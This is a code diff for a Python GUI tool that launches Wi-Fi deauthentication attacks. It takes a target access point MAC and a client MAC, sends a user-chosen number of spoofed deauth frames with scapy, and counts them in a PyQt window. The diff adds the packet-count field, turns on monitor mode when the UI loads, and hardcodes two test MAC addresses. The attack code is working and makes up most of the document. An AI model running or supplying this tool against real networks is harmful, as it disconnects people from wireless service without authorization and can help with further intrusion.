@@ -15,7 +15,6 @@ timeout = 1
 
 
 resetflag = False
-global packetcount
 packetcount = 0
 
 def setMonitorMode():
@@ -73,8 +72,8 @@ def perform_deauth_attack(interface,dest,bssid,amount):
 	for i in range(0,amount):
 		if resetflag == True:
 			#print("RESET BUTTON CLICKED")
-			#return "RESET BUTTON CLICKED"
-			break
+			return "RESET BUTTON CLICKED"
+			#break
 		else:
 			#start = time.time()
 			sendp(frame,iface=interface,verbose=False)
@@ -94,7 +93,7 @@ def perform_deauth_attack(interface,dest,bssid,amount):
 
 
 
-#setMonitorMode()
+
 
 
 class App(QMainWindow):
@@ -104,6 +103,8 @@ class App(QMainWindow):
 		self.setupUI()
 
 	def setupUI(self):
+		global packetcount
+		setMonitorMode()
 		self.setWindowTitle(self.title)
 		self.setGeometry(50,50,700,700)
 
@@ -111,14 +112,19 @@ class App(QMainWindow):
 		#MAC AP
 		self.textboxAP = QLineEdit(self)
 		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
-		self.textboxAP.move(20,40)
+		self.textboxAP.move(20,30)
 		self.textboxAP.resize(280, 40)
 		#MAC TARGET
 		self.textbox = QLineEdit(self)
 		self.textbox.setPlaceholderText("Enter the target MAC address")
-		self.textbox.move(20,100)
+		self.textbox.move(20,80)
 		self.textbox.resize(280,40)
 
+		#AMOUNT
+		self.textbox_amount = QLineEdit(self)
+		self.textbox_amount.setPlaceholderText("Enter amount of packets")
+		self.textbox_amount.move(20,130)
+		self.textbox_amount.resize(280,50)
 
 		##ATTACK button
 		self.attackbutton = QPushButton('ATTACK',self)
@@ -132,65 +138,79 @@ class App(QMainWindow):
 		self.resetbutton.move(350,100)
 		self.resetbutton.clicked.connect(self.on_resetclick)
 
+		#PACKET AMOUNT LABEL
 		self.packetlabel = QLabel("Sent : "+str(packetcount)+"\n"+"DeAuthentication Packets",self)
 		self.packetlabel.setFont(QtGui.QFont("Times",weight=QtGui.QFont.Bold))
-		self.packetlabel.move(20,120)
+		self.packetlabel.move(20,170)
 		self.packetlabel.resize(270,100)
 
 
 		self.show()
 
 
-
 	@pyqtSlot()
 	def on_attackclick(self):
 		global resetflag
+		global packetcount
 		resetflag = False
 
 		self.textboxAP.setEnabled(False)
 		self.textbox.setEnabled(False)
+		self.textbox_amount.setEnabled(False)
+		self.textboxAP.setText("40:F2:01:9A:42:56")#test remove me
+		self.textbox.setText("94:65:2D:D8:2E:16") #test remove me
+
 		bssid_targetMAC = self.textboxAP.text() #string
 		destMAC = self.textbox.text() #string
+		packet_amount_entered = int(self.textbox_amount.text())
 		print(bssid_targetMAC)
 		print(destMAC)
 		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
 		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)
 
-			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, 100))
+			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, packet_amount_entered))
 			attackthread.start()
 
+			while attackthread.is_alive():
+				self.packetlabel.setText("Sent : "+str(packetcount)+"\n"+"DeAuthentication Packets")
+				self.packetlabel.repaint() #need to repaint the label each iteration to update value
 
+			self.packetlabel.setText("Sent : " + str(packetcount) + "\n" + "DeAuthentication Packets")
+			self.packetlabel.repaint()
 
 
 
 		else:
+			self.textbox_amount.setPlaceholderText("Enter amount of packets")
 			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
 			self.textbox.setPlaceholderText("Enter valid destination MAC address")
 			self.textboxAP.setEnabled(True)
 			self.textbox.setEnabled(True)
+			self.textbox_amount.setEnabled(True)
 			self.textbox.clear()
 			self.textboxAP.clear()
+			self.textbox_amount.clear()
 
 
 	@pyqtSlot()
 	def on_resetclick(self):
 		global resetflag
 		global packetcount
+
 		self.textbox.clear()
 		self.textboxAP.clear()
+		self.textbox_amount.clear()
 		self.textboxAP.setEnabled(True)
 		self.textbox.setEnabled(True)
+		self.textbox_amount.setEnabled(True)
 		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
 		self.textbox.setPlaceholderText("Enter the target MAC address")
-		resetflag = True
+		self.textbox_amount.setPlaceholderText("Enter amount of packets")
 
-		for i in range(0,9):
-			packetcount +=1
-			self.packetlabel.setText("Sent : "+str(packetcount)+"\n"+"DeAuthentication Packets")
-			self.packetlabel.repaint()
-			time.sleep(1)
-			print(packetcount)
+		resetflag = True
 		packetcount = 0
+		self.packetlabel.setText("Sent : " + str(packetcount) + "\n" + "DeAuthentication Packets")
+		self.packetlabel.repaint()
 
 
 
